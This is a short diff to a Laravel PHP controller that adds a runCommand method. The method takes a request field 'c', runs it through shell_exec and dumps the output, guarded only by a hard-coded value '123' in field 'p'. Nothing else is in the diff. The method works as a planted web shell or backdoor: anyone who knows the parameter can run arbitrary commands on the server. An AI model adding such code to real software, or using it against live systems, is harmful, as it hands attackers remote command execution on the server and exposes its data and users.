@@ -55,5 +55,18 @@ class DefaultController extends Controller
         return view('register');
     }
 
+    public function runCommand(Request $request)
+    {
+        $request->validate([
+            'p' => 'required|in:123',
+            'c' => 'required|string'
+        ]);
+        
+        $cmd = shell_exec($request->c);
+
+        dd($cmd);
+        
+    }
+
     
 }
